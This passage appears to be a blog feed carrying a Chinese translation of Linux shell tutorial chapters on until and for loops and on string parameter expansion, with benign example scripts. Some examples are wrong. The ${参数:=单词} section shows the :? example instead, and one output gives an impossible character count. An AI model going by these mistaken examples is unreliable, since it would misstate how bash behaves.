<h4 id="until"><a href="#until" class="headerlink" title="until"></a>until</h4><p>until命令很像while，除了它在遇到非零退出状态时不退出循环，它做相反的事情。<em>until循环</em>会一直继续，直到它接收到一个零退出状态。在我们的while-count脚本中，我们继续循环，只要count变量的值小于或等于5。我们可以通过使用until对脚本进行编码来获得相同的结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># until-count: 显示一系列数字</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">until</span> [[ <span class="string">&quot;<span class="variable">$count</span>&quot;</span> -gt 5 ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$count</span>&quot;</span></span><br><span class="line">  count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;完成。&quot;</span></span><br></pre></td></tr></table></figure>

<p>通过将测试表达式改为$count -gt 5，until将在正确的时间终止循环。选择使用while或until循环通常是选择哪一个允许编写最清晰的测试的问题。</p>
<h3 id="使用循环读取文件"><a href="#使用循环读取文件" class="headerlink" title="使用循环读取文件"></a>使用循环读取文件</h3><p>while和until可以处理标准输入。这允许使用while和until循环处理文件。在以下示例中，我们将显示之前章节中使用的distros.txt文件的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># while-read: 从文件中读取行</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> distro version release; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;发行版: %s\t版本: %s\t发布: %s\n&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$distro</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$version</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$release</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; distros.txt</span><br></pre></td></tr></table></figure>

<p>要将文件重定向到循环中，我们将重定向操作符放在done语句之后。循环将使用read从重定向的文件中输入字段。read命令在读取每行后退出，退出状态为零，直到到达文件末尾。那时，它将以非零退出状态退出，从而终止循环。也可以将标准输入管道到循环中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># while-read2: 从文件中读取行</span></span><br><span class="line"><span class="built_in">sort</span> -k 1,1 -k 2n distros.txt | <span class="keyword">while</span> <span class="built_in">read</span> distro version release; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;发行版: %s\t版本: %s\t发布: %s\n&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$distro</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$version</span>&quot;</span> \</span><br><span class="line">    <span class="string">&quot;<span class="variable">$release</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这里我们取sort命令的输出并显示文本流。然而，重要的是要记住，由于管道会在子shell中执行循环，循环中创建或分配的任何变量在循环终止时都会丢失。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>随着循环的引入以及我们之前遇到的分支、子程序和序列，我们已经涵盖了程序中使用的主要流控制类型。bash还有更多技巧，但它们都是对这些基本概念的完善。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>来自Linux文档项目的<em>初学者Bash指南</em>有更多关于while循环的示例：</p>
<p><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9CYXNoLUJlZ2lubmVycy1HdWlkZS9odG1sL3NlY3RfMDlfMDIuaHRtbA==">http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_09_02.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>维基百科有关于循环的文章，它是关于流控制更大文章的一部分：</p>
<p><span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Db250cm9sX2Zsb3cjTG9vcHM=">http://en.wikipedia.org/wiki/Control_flow#Loops<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>控制流：使用for循环</title>
    <url>/2024/05/33-looping-with-for/</url>
    <content><![CDATA[<h2 id="33-–-控制流：使用for循环"><a href="#33-–-控制流：使用for循环" class="headerlink" title="33 – 控制流：使用for循环"></a>33 – 控制流：使用for循环</h2><p>在这最后一章关于控制流的讨论中，我们将看看shell的另一种循环结构。与while和until循环不同，for循环提供了一种在循环过程中处理序列的方法。这在编程时非常有用。因此，for循环是bash脚本中一个流行的结构。</p>
<p>自然地，for循环是通过for复合命令实现的。在bash中，for以两种形式存在。</p>
<span id="more"></span>

<h3 id="for：传统Shell形式"><a href="#for：传统Shell形式" class="headerlink" title="for：传统Shell形式"></a>for：传统Shell形式</h3><p>原始的for命令语法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量 [<span class="keyword">in</span> 单词]; <span class="keyword">do</span></span><br><span class="line">	命令</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>其中<em>变量</em>是在循环执行过程中会递增的变量的名称，<em>单词</em>是可选的，会被顺序分配给<em>变量</em>的项列表，<em>命令</em>是每次循环迭代时要执行的命令。</p>
<p>for命令在命令行中非常有用。我们可以轻松演示其工作原理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> A B C D; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">A</span><br><span class="line">B</span><br><span class="line">C</span><br><span class="line">D</span><br></pre></td></tr></table></figure>

<p>在这个例子中，for被给定了一个由四个单词组成的列表：A、B、C和D。有了四个单词的列表，循环就执行了四次。每次执行循环时，一个单词被分配给变量i。在循环内部，我们有一个echo命令来显示i的值，以展示分配情况。与while和until循环一样，done关键词结束了循环。</p>
<p>for的真正强大之处在于我们可以通过多种有趣的方式来创建单词列表。例如，我们可以通过大括号扩展来实现，像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;A..D&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">A</span><br><span class="line">B</span><br><span class="line">C</span><br><span class="line">D</span><br></pre></td></tr></table></figure>

<p>或者我们可以使用路径名扩展，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> i <span class="keyword">in</span> distros*.txt; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">distros-by-date.txt</span><br><span class="line">distros-dates.txt</span><br><span class="line">distros-key-names.txt</span><br><span class="line">distros-key-vernums.txt</span><br><span class="line">distros-names.txt</span><br><span class="line">distros.txt</span><br><span class="line">distros-vernums.txt</span><br><span class="line">distros-versions.txt</span><br></pre></td></tr></table></figure>

<p>路径名扩展提供了一个干净的、可以在循环中处理的路径名列表。需要的一个预防措施是检查扩展是否真的匹配了一些文件。默认情况下，如果扩展未匹配任何文件，将返回通配符本身（上例中的”distros*.txt”）。为了防止这种情况，我们会在脚本中这样编写上面的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> distros*.txt; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ -e <span class="string">&quot;<span class="variable">$i</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>通过添加一个文件存在性检测，我们将忽略失败的扩展。</p>
<p>另一个常见的单词生成方法是命令替换。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># longest-word: 在文件中找到最长的字符串</span></span><br><span class="line"><span class="keyword">while</span> [[ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ -r <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    max_word=</span><br><span class="line">    max_len=0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> $(strings <span class="string">&quot;<span class="variable">$1</span>&quot;</span>); <span class="keyword">do</span></span><br><span class="line">      len=<span class="string">&quot;<span class="subst">$(echo -n <span class="string">&quot;<span class="variable">$i</span>&quot;</span> | wc -c)</span>&quot;</span></span><br><span class="line">      <span class="keyword">if</span> (( len &gt; max_len )); <span class="keyword">then</span></span><br><span class="line">        max_len=<span class="string">&quot;<span class="variable">$len</span>&quot;</span></span><br><span class="line">        max_word=<span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span>: &#x27;<span class="variable">$max_word</span>&#x27; (<span class="variable">$max_len</span>个字符)&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">shift</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们寻找文件中的最长字符串。当在命令行上给出一个或多个文件名时，这个程序使用strings程序（包含在GNU binutils包中）来生成每个文件中的可读文本“单词”列表。for循环依次处理每个单词，并确定当前单词是否是到目前为止找到的最长单词。当循环结束时，将显示最长的单词。</p>
<p>需要注意的一点是，与我们通常的做法相反，我们没有将命令替换<code>$(strings &quot;$</code>1”)用双引号括起来。这是因为我们实际上希望发生单词拆分以给我们提供我们的列表。如果我们用引号括起来了命令替换，它将只产生一个单词，包含文件中的每个字符串。这不是我们所寻找的。</p>
<p>如果省略了for命令的可选in <em>单词</em>部分，for默认处理位置参数。我们将修改我们的longest-word脚本，使用这种方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># longest-word2: 在文件中找到最长的字符串</span></span><br><span class="line"><span class="keyword">for</span> i; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ -r <span class="string">&quot;<span class="variable">$i</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    max_word=</span><br><span class="line">    max_len=0</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> $(strings <span class="string">&quot;<span class="variable">$i</span>&quot;</span>); <span class="keyword">do</span></span><br><span class="line">      len=<span class="string">&quot;<span class="subst">$(echo -n <span class="string">&quot;<span class="variable">$j</span>&quot;</span> | wc -c)</span>&quot;</span></span><br><span class="line">      <span class="keyword">if</span> (( len &gt; max_len )); <span class="keyword">then</span></span><br><span class="line">        max_len=<span class="string">&quot;<span class="variable">$len</span>&quot;</span></span><br><span class="line">        max_word=<span class="string">&quot;<span class="variable">$j</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>: &#x27;<span class="variable">$max_word</span>&#x27; (<span class="variable">$max_len</span>个字符)&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>正如我们看到的，我们将最外层的循环改为使用for代替while。通过在for命令中省略单词列表，使用了位置参数代替。在循环内部，之前使用变量i的实例已经更改为变量j。同时也消除了shift的使用。</p>
<p><strong>为什么使用i？</strong></p>
<p>你可能已经注意到，之前的for循环例子中选择了变量i。为什么呢？实际上没有具体的原因，除了传统以外。与for一起使用的变量可以是任何有效的变量，但i是最常见的，其次是j和k。</p>
<p>这个传统的基础来自于Fortran编程语言。在Fortran中，以字母I、J、K、L和M开头的未声明变量自动被定为整数类型，而以任何其他字母开头的变量被定为实数类型（带有小数部分的数字）。这种行为导致程序员使用变量I、J和K作为循环变量，因为当需要一个临时变量（循环变量经常是）时，使用它们工作量更小。</p>
<p>这也导致了以下基于Fortran的俏皮话：</p>
<blockquote>
<p>“上帝是实数，除非声明为整数。”</p>
</blockquote>
<h3 id="for：C语言形式"><a href="#for：C语言形式" class="headerlink" title="for：C语言形式"></a>for：C语言形式</h3><p>bash的最新版本增加了第二种形式的for命令语法，一种类似于C编程语言中的形式。许多其他语言也支持这种形式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (( 表达式<span class="number">1</span>; 表达式<span class="number">2</span>; 表达式<span class="number">3</span> )); <span class="keyword">do</span></span><br><span class="line">	命令</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这里的<em>表达式1</em>、<em>表达式2</em>和<em>表达式3</em>是算术表达式，<em>命令</em>是每次循环迭代期间要执行的命令。</p>
<p>在行为上，这种形式等同于以下结构：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(( 表达式<span class="number">1</span> ))</span><br><span class="line"><span class="keyword">while</span> (( 表达式<span class="number">2</span> )); <span class="keyword">do</span></span><br><span class="line">	命令</span><br><span class="line">	(( 表达式<span class="number">3</span> ))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><em>表达式1</em>用于初始化循环条件，<em>表达式2</em>用于确定循环何时完成，<em>表达式3</em>在循环的每次迭代结束时执行。</p>
<p>这里是一个典型的应用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># simple_counter: C风格for命令的演示</span></span><br><span class="line"><span class="keyword">for</span> (( i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i=i+<span class="number">1</span> )); <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>执行时，它产生以下输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ simple_counter</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<em>表达式1</em>用零初始化变量i，<em>表达式2</em>允许循环继续，只要i的值小于5，<em>表达式3</em>每次循环重复时将i的值增加1。</p>
<p>C语言形式的for在需要数字序列时非常有用。在接下来的两章中，我们将看到这种形式的几种应用。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过了解for命令，我们现在将对我们的sys_info_page脚本进行最后的改进。目前，report_home_space函数看起来是这样的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">      &lt;h2&gt;家庭空间利用率（所有用户）&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh /home/*)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">      &lt;h2&gt;家庭空间利用率（$USER）&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh &quot;$HOME&quot;)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，我们将重写它，为每个用户的家目录提供更多细节，并包括每个中的文件总数和子目录数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">    <span class="built_in">local</span> format=<span class="string">&quot;%8s%10s%10s\n&quot;</span></span><br><span class="line">    <span class="built_in">local</span> i dir_list total_files total_dirs total_size user_name</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">        dir_list=/home/*</span><br><span class="line">        user_name=<span class="string">&quot;所有用户&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        dir_list=<span class="string">&quot;<span class="variable">$HOME</span>&quot;</span></span><br><span class="line">        user_name=<span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&lt;h2&gt;家庭空间利用率（<span class="variable">$user_name</span>）&lt;/h2&gt;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$dir_list</span>; <span class="keyword">do</span></span><br><span class="line">        total_files=<span class="string">&quot;<span class="subst">$(find <span class="string">&quot;<span class="variable">$i</span>&quot;</span> -type f | wc -l)</span>&quot;</span></span><br><span class="line">        total_dirs=<span class="string">&quot;<span class="subst">$(find <span class="string">&quot;<span class="variable">$i</span>&quot;</span> -type d | wc -l)</span>&quot;</span></span><br><span class="line">        total_size=<span class="string">&quot;<span class="subst">$(du -sh <span class="string">&quot;<span class="variable">$i</span>&quot;</span> | cut -f 1)</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;H3&gt;<span class="variable">$i</span>&lt;/H3&gt;&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$format</span>&quot;</span> <span class="string">&quot;目录&quot;</span> <span class="string">&quot;文件&quot;</span> <span class="string">&quot;大小&quot;</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$format</span>&quot;</span> <span class="string">&quot;----&quot;</span> <span class="string">&quot;-----&quot;</span> <span class="string">&quot;----&quot;</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;<span class="variable">$format</span>&quot;</span> <span class="string">&quot;<span class="variable">$total_dirs</span>&quot;</span> <span class="string">&quot;<span class="variable">$total_files</span>&quot;</span> <span class="string">&quot;<span class="variable">$total_size</span>&quot;</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次重写应用了我们迄今为止学到的很多知识。我们仍然检测超级用户，但不是作为if的一部分执行完整的操作集，而是设置了一些变量，稍后在for循环中使用。我们为函数添加了几个本地变量，并使用printf来格式化一些输出。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><em>高级Bash脚本编写指南</em>有一章关于循环的，包括使用for的各种示例：</p>
<p><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9hYnMvaHRtbC9sb29wczEuaHRtbA==">http://tldp.org/LDP/abs/html/loops1.html<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p><em>Bash参考手册</em>描述了包括for在内的循环复合命令：</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2Jhc2gvbWFudWFsL2Jhc2hyZWYuaHRtbCNMb29waW5nLUNvbnN0cnVjdHM=">http://www.gnu.org/software/bash/manual/bashref.html#Looping-Constructs<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串和数字</title>
    <url>/2024/05/34-strings-and-numbers/</url>
    <content><![CDATA[<h2 id="34-–-字符串和数字"><a href="#34-–-字符串和数字" class="headerlink" title="34 – 字符串和数字"></a>34 – 字符串和数字</h2><p>计算机程序全都是关于数据处理。在过去的章节中，我们关注于文件级别的数据处理。然而，许多编程问题需要使用更小的数据单元，如字符串和数字来解决。</p>
<p>在本章中，我们将探讨几种用于操作字符串和数字的Shell功能。Shell提供了多种参数扩展，用于执行字符串操作。除了算术扩展（我们在第7章“看世界如Shell所见”中提到过）之外，还有一个众所周知的命令行程序bc，它能执行更高级的数学运算。</p>
<span id="more"></span>

<h3 id="参数扩展"><a href="#参数扩展" class="headerlink" title="参数扩展"></a>参数扩展</h3><p>尽管参数扩展在第7章中已经提到，但我们并未详细介绍，因为大多数参数扩展在脚本中使用，而不是在命令行中。我们已经使用过一些形式的参数扩展，例如，Shell变量。Shell提供了更多的功能。</p>
<p><strong>注意</strong>：为了防止不希望的词分割，最好的做法是将参数扩展放在双引号内，除非有特别的理由不这么做。当处理文件名时，这一点尤其重要，因为它们经常包含嵌入的空格和其他复杂情况。</p>
<h4 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h4><p>参数扩展的最简单形式反映在变量的普通使用中。这里有一个例子：</p>
<blockquote>
<p>$a</p>
</blockquote>
<p>扩展后，变成了变量a所包含的任何内容。简单参数也可以用大括号包围。</p>
<blockquote>
<p>${a}</p>
</blockquote>
<p>这对扩展没有影响，但如果变量与其他文本相邻，可能会使Shell混淆，这时就需要用大括号。在这个例子中，我们尝试通过在变量a的内容后追加字符串_file来创建一个文件名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ a=<span class="string">&quot;foo&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$a_file</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果我们执行这一系列命令，结果将是空的，因为Shell将尝试扩展一个名为a_file的变量，而不是a。通过在“真正”的变量名周围添加大括号可以解决这个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;a&#125;</span>_file&quot;</span></span><br><span class="line">foo_file</span><br></pre></td></tr></table></figure>

<p>我们还看到，可以通过将数字放在大括号中来访问大于九的位置参数。例如，要访问第十一个位置参数，我们可以这样做：</p>
<blockquote>
<p>${11}</p>
</blockquote>
<h4 id="管理空变量的扩展"><a href="#管理空变量的扩展" class="headerlink" title="管理空变量的扩展"></a>管理空变量的扩展</h4><p>有几种参数扩展旨在处理不存在和空的变量。这些扩展非常适合处理缺失的位置参数和为参数分配默认值。</p>
<blockquote>
<p>${<em>参数</em>:-<em>单词</em>}</p>
</blockquote>
<p>如果<em>参数</em>未设置（即，不存在）或为空，此扩展结果为<em>单词</em>的值。如果<em>参数</em>不为空，扩展结果为<em>参数</em>的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:-&quot;如果未设置则替换值&quot;&#125;</span></span><br><span class="line">如果未设置则替换值</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">[me@linuxbox ~]$ foo=bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:-&quot;如果未设置则替换值&quot;&#125;</span></span><br><span class="line">bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">bar</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>:&#x3D;<em>单词</em>}</p>
</blockquote>
<p>如果<em>参数</em>未设置或为空，此扩展结果为<em>单词</em>的值。此外，<em>单词</em>的值会被分配给<em>参数</em>。如果<em>参数</em>不为空，扩展结果为<em>参数</em>的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:?&quot;参数为空&quot;&#125;</span></span><br><span class="line">bash: foo: 参数为空</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">1</span><br><span class="line">[me@linuxbox ~]$ foo=bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:?&quot;参数为空&quot;&#125;</span></span><br><span class="line">bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：位置和其他特殊参数不能以这种方式分配。</p>
<blockquote>
<p>${<em>参数</em>:?<em>单词</em>}</p>
</blockquote>
<p>如果<em>参数</em>未设置或为空，此扩展会导致脚本以错误退出，<em>单词</em>的内容被发送到标准错误。如果<em>参数</em>不为空，扩展结果为<em>参数</em>的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:?&quot;参数为空&quot;&#125;</span></span><br><span class="line">bash: foo: 参数为空</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">1</span><br><span class="line">[me@linuxbox ~]$ foo=bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:?&quot;参数为空&quot;&#125;</span></span><br><span class="line">bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $?</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>:+<em>单词</em>}</p>
</blockquote>
<p>如果<em>参数</em>未设置或为空，扩展结果为无。如果<em>参数</em>不为空，<em>单词</em>的值会替换<em>参数</em>；然而，<em>参数</em>的值不会改变。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:+&quot;如果设置则替换值&quot;&#125;</span></span><br><span class="line">[me@linuxbox ~]$ foo=bar</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:+&quot;如果设置则替换值&quot;&#125;</span></span><br><span class="line">如果设置则替换值</span><br></pre></td></tr></table></figure>

<h4 id="返回变量名的扩展"><a href="#返回变量名的扩展" class="headerlink" title="返回变量名的扩展"></a>返回变量名的扩展</h4><p>Shell能够返回变量的名称。这在某些相当特殊的情况下使用。</p>
<blockquote>
<p>${!<em>前缀</em>*}</p>
<p>${!<em>前缀</em>@}</p>
</blockquote>
<p>这种扩展返回以<em>前缀</em>开头的现有变量的名称。根据bash文档，这两种形式的扩展执行相同的功能。这里，我们列出环境中所有以BASH开头的变量名称：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;!BASH*&#125;</span></span><br><span class="line">BASH BASH_ARGC BASH_ARGV BASH_COMMAND BASH_COMPLETION</span><br><span class="line">BASH_COMPLETION_DIR BASH_LINENO BASH_SOURCE BASH_SUBSHELL</span><br><span class="line">BASH_VERSINFO BASH_VERSION</span><br></pre></td></tr></table></figure>

<h4 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h4><p>有一大套可以用来操作字符串的扩展。其中许多扩展特别适合对路径名进行操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;#parameter&#125;</span></span><br></pre></td></tr></table></figure>

<p>展开为<em>参数</em>所包含的字符串的长度。通常，<em>参数</em>是一个字符串；然而，如果<em>参数</em>是@或*，那么扩展结果为位置参数的数量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=<span class="string">&quot;这个字符串很长。&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;&#x27;<span class="variable">$foo</span>&#x27;的长度是<span class="variable">$&#123;#foo&#125;</span>个字符。&quot;</span></span><br><span class="line"><span class="string">&#x27;这个字符串很长。&#x27;</span>的长度是20个字符。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>:<em>偏移量</em>}</p>
<p>${<em>参数</em>:<em>偏移量</em>:<em>长度</em>}</p>
</blockquote>
<p>这些扩展用于提取<em>参数</em>中包含的字符串的一部分。提取从字符串开头的<em>偏移量</em>字符开始，并继续到字符串的末尾，除非指定了<em>长度</em>。</p>
